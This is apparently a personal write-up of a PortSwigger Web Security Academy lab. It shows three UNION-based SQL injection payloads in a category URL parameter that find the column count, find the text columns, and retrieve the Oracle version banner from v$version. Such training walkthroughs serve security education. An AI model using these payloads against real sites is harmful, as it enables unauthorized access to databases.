---
title: 'Lab: SQL injection attack, querying the database type and version on Oracle'
tags: [Portswigger Web Security Academy, Web]

category: "Security Practice｜Portswigger Web Security Academy｜SQL"
date: 2023-04-25
---

# Lab: SQL injection attack, querying the database type and version on Oracle
<!-- more -->
###### tags: `Portswigger Web Security Academy` `Web`
* Description: This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query. 
* Our Goal: To solve the lab, display the database version string.

## Exp - [SQLi Cheat Sheet - Examining the database in SQL injection attacks](https://portswigger.net/web-security/sql-injection/examining-the-database)
According to the cheat sheet above, we can use the command to fetch the version of this database, e.g. 
![](https://i.imgur.com/Qxtgz5u.png)
:::warning
Before the recon, the hint told you that this database is created by `Oracle`. So, you must contained `From` preserved word in each query, e.g. `SELECT 'abc' FROM dual`
:::
1. Determine # of columns that are being returned by the query
Payload: `?category=Gifts' union select NULL,NULL from v$version--`

2. Which columns contain text data
Payload: `?category=Gifts' union select 'a','b' from v$version--`
Two of them are text data

3. Attack
Payload: `?category=Gifts' UNION SELECT BANNER,'abc' FROM v$version--`
    :::spoiler Result
    ![](https://i.imgur.com/KqhEhpV.png)
    :::

## Reference